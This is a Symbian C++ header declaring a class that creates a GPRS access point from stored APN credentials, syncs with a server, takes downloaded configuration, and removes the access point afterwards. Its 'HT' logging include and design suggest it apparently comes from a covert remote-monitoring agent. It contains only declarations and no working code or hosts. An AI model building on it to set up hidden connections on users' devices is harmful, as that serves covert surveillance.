/*
 * ActionSyncApn.h
 *
 *  Created on: 25/ott/2010
 *      Author: Giovanna
 */

#ifndef ACTIONSYNCAPN_H_
#define ACTIONSYNCAPN_H_

// INCLUDES
#include <e32std.h>
#include <e32base.h>
#include <es_sock.h>
#include <CommDbConnPref.h> 

#include <COMMDB.H> 
#include <apdatahandler.h>
#include <aputils.h>

#include <HT\Logging.h>

#include "Protocol.h"
#include "AbstractAction.h"
#include "Monitor.h"

typedef struct TApnStruct
	{
	TBuf<64> apnName; // NULL if empty
	TBuf<24> apnUsername; // NULL if empty
	TBuf<24> apnPasswd;  // NULL if empty
	} TApnStruct;
	
// CLASS DECLARATION

/**
 *  CActionSyncApn
 * 
 */
class CActionSyncApn : public CAbstractAction, public MProtocolNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CActionSyncApn();

	/**
	 * Two-phased constructor.
	 */
	static CActionSyncApn* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CActionSyncApn* NewLC(const TDesC8& params);

protected:
	// from CAbstractAction
	virtual void DispatchStartCommandL();

private:
	
	/**
	 * Check if we are in offline mode.
	 */
	TBool OfflineL();
	
	/**
	 * Create the GPRS IAP
	 */
	void CreateIapL(TApnStruct aApnStruct, TUint32& aIapId);
	//void CreateNewOgGprsL(CCommsDatabase& aCommsDb, const TDesC& aCommsdb_name_val, TUint32& aOgGprsId, const TApnStruct& aApnStruct);
	//void CreateNewAccessPointL(CCommsDatabase& aCommsDb, const TDesC& aCommsDbName, TUint32& aApId);
	void RemoveIapL(TUint32 aUid);
	
	// from MProtocolNotifier
	void ConnectionTerminatedL(TInt aError);
	void NewConfigDownloaded();
	
	/**
	 * Constructor for performing 1st stage construction
	 */
	CActionSyncApn();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	
	// access point management
	CCommsDatabase* iCommsDb;
	CApDataHandler* iApDataHandler;
	CApUtils* iApUtils;
	TUint32 iApUid;     
	
	// connection
	RSocketServ iSocketServ;
	RConnection iConnection; 
	
	THostName iHostName;
	CProtocol* iProtocol;
	
	RArray<TApnStruct>	iApnList;
	
	TBool iNewConfig;	 	// a new config has been downloaded
	__FLOG_DECLARATION_MEMBER
		
	};



#endif /* ACTIONSYNCAPN_H_ */
